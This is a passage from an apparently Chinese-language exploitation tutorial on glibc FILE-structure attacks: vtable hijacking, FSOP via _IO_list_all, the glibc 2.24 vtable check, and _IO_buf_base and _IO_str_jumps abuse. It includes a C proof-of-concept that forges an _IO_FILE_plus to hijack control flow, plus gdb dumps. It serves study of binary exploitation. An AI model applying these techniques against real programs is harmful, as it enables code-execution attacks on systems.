class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分配一块内容来存放伪造的vtable，之后修改IO_FILE_plus的vtable指针指向这块内存。后面的步骤与上面一样，修改xsputn对应的指针为system函数地址，然后修改_IO_FILE_plus头部为sh，最后用fwrite出发xsputn指针的调用即可。</p><h1 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h1><p>FSOP是file stream oriented programing的缩写，根据前面对FILE的介绍得知进程内所有的_IO_FILE结构会使用_chain域相互连接形成一个链表，这个链表的头部由_IO_list_all维护。FSOP的核心思想就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项，但是单纯的只是构造了数据，还需要用某种方法进行触发。FSOP选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all链表的所有项的文件流，相当于对每个FILE调用fflush，也对应这会调用_IO_FILE_plus.vtable中的_IO_overflow。<br>而_IO_flush_all_lockp不需要攻击者手动调用，在一些情况下这个函数会被系统调用：<br>1、当libc执行abort流程时<br>2、当执行exit函数时<br>3、当执行流从main函数返回时</p><h1 id="具体用法-1"><a href="#具体用法-1" class="headerlink" title="具体用法"></a>具体用法</h1><p>_IO_list_all是作为全局变量存储在libc.so中的，所以首先需要泄露libc.so的基址，之后需要用任意地址写把_IO_list_all的内容改为指向我们可控内存的指针，然后在可控内存中布置上理想函数的vtable指针。为了能让我们构造的fake_FILE能够正常工作，这里需要满足以下条件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>也就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.f</span>p-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line"><span class="number">2.f</span>p-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure><p>看demo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+vtable_offset)=((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=<span class="number">0x41414141</span>;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(<span class="keyword">long</span> <span class="keyword">long</span> *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里分配了一个0x200大小的块用于伪造_IO_FILE_plus，前0x100伪造_IO_FILE，后0x100伪造vtable，在vtable中使用0x41414141覆盖_IO_overflow指针。之后覆盖位于libc中的全局变量_IO_list_all，把它指向我们伪造的_IO_FILE_plus。这样，通过调用exit函数，程序会执行_IO_list_all，把它指向我们伪造的_IO_FILE_plus。这样，通过调用exit函数，程序会执行_IO_flush_all_lockp，经过fflush获取_IO_list_all的值并取出作为_IO_FILE_plus调用其中的_IO_overflow。也就是最终实现call 0x41414141的效果。</p><h1 id="glibc-2-24下IO-FILE的利用"><a href="#glibc-2-24下IO-FILE的利用" class="headerlink" title="glibc 2.24下IO_FILE的利用"></a>glibc 2.24下IO_FILE的利用</h1><p>在2.24八本的glibc中，全新加入了针对IO_FILE_plus的vtable劫持的检测措施，glibc会在调用虚函数之前首先检查vtable地址的合法性。首先会验证vtable是否位于_IO_vtable段中，如果满足条件就正常执行，否则会调用_IO_vtable_check做进一步检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="keyword">void</span> _IO_vtable_check (<span class="keyword">void</span>) attribute_hidden;</span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">uintptr_t</span> ptr = (<span class="keyword">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - (<span class="keyword">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;，紧接着会判断vtable - __start___libc_IO_vtables的offset,如果这个offset大于section_length,即大于__stop___libc_IO_vtables - __start___libc_IO_vtables那么就会调用_IO_vtable_check()这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 vtable 是非法的，那么会引发 abort。这里的检查使得以往使用 vtable 进行利用的技术很难实现。</p><h1 id="新的利用技术"><a href="#新的利用技术" class="headerlink" title="新的利用技术"></a>新的利用技术</h1><h3 id="fileno与缓冲区的相关利用"><a href="#fileno与缓冲区的相关利用" class="headerlink" title="fileno与缓冲区的相关利用"></a>fileno与缓冲区的相关利用</h3><p>在vtable难以被利用之后，利用的关注点从vtable转移到_IO_FILE结构内部的域中。前面介绍过_IO_FILE在使用标准IO库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如fwrite、fread等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或者任意地址读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为进程中包含了系统默认的三个文件流stdin\stdout\stderr，因此这种方式可以不需要进程汇总存在文件操作，通过scanf\printf一样可以进行利用。在_IO_FILE中_IO_buf_base表示操作的起始地址，_IO_buf_end表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">char</span> stack_buf[<span class="number">100</span>];</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,stack_buf);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,stack_buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在执行程序一次使用stdin之前，stdin的内容还是未初始化的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> gdb-peda$ x /<span class="number">40</span>xg <span class="number">0x7ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:<span class="number">0x00000000fbad2088</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:<span class="number">0xffffffffffffffff</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:<span class="number">0x00007ffff7dd19c0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7dd06e0</span></span><br></pre></td></tr></table></figure><p>调用scanf之后可以看到_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end等域都被初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">40</span>xg <span class="number">0x7ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:<span class="number">0x00000000fbad2288</span><span class="number">0x0000000000602011</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:<span class="number">0x0000000000602012</span><span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:<span class="number">0x0000000000602010</span><span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:<span class="number">0x0000000000602010</span><span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:<span class="number">0x0000000000602410</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:<span class="number">0xffffffffffffffff</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:<span class="number">0x00007ffff7dd19c0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:<span class="number">0x00000000ffffffff</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7dd06e0</span></span><br></pre></td></tr></table></figure><p>可以看到缓冲区就是从堆分配的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk                </span><br><span class="line"><span class="number">0x602000</span>            <span class="number">0x0</span>                 <span class="number">0x410</span>                Used                None              None</span><br></pre></td></tr></table></figure><p>执行一次scanf后，可以看到缓冲区中有我们输入的数据字符’c’</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">10</span>xg <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000411</span></span><br><span class="line"><span class="number">0x602010</span>:<span class="number">0x0000000000000a63</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000000000</span></span><br></pre></td></tr></table></figure><p>也就是说如果我们能够修改_IO_buf_base、_IO_buf_end域，我们就可以进行任意地址的读写。</p><p>###_IO_str_jumps<br>libc中不仅仅只有_IO_file_jumps这么一个vtable，还有一个叫_IO_str_jumps的，这个vtable不在check的范围之内。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们能设置文件指针的 vtable 为 _IO_str_jumps 么就能调用不一样的文件操作函数。</p><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span 